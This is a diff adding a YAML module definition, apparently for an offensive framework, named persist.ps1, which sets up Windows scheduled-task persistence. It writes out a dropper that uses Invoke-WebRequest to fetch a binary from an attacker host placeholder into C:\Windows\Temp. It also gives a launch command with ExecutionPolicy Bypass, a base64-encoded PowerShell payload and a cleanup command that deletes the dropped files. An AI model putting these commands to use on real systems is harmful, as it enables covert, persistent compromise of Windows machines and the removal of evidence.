@@ -1,0 +1,24 @@
+id: 6
+name: persist.ps1
+description: Creates a scheduled task for persistent execution of a payload on Windows
+technique_name: Scheduled Task Persistence
+technique_id: LAE06
+target_os: windows
+executer: powershell
+lang: powershell
+binary: persist.exe
+path_src: sessions/powershell
+output_path: sessions
+target_path: C:\\Windows\\Temp\\
+pid: ""
+param: ""
+encoder: base64
+shellcode: ""
+replace_command: ""
+copy_command: cp {path_src}/{name} {output_path}/{name}
+compile: ""
+droper: powershell.exe -Command "Invoke-WebRequest -Uri http://{lhost}/{binary} -OutFile {target_path}{binary}"
+command: powershell.exe -ExecutionPolicy Bypass -File {target_path}{name}
+payload: powershell.exe -EncodedCommand {base64_command}
+clean_cmd: powershell.exe -Command "Remove-Item {target_path}{binary}; Remove-Item {target_path}{name}"
+sleep: 2
